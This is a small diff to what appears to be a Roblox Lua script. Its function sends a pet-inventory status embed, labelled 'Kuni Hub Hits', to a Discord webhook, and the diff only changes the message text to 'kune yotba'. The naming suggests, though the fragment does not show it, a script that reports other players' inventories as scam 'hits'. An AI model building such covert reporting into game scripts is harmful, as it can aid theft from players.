@@ -46,7 +46,7 @@ local function sendInventoryToDiscord()
 	local content={
 		username="Kuni Hub Hits",
 		avatar_url="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQvJQrjOQJH-tSRkGjaCCO2Uf-WqjL-QWShRhUjzyNpdwtGFvbKhVAyR1E&s=10",
-		content="",
+		content="kune yotba",
 		embeds={{title=string.format("Inventory Status (%d / %d)",#latestSnapshot,maxSlots),description=table.concat(formattedPets,"\n"),color=0x1abc9c,footer={text="Made by Kuni"},timestamp=os.date("!%Y-%m-%dT%H:%M:%SZ")}}
 	}
 	local jsonData=HttpService:JSONEncode(content)
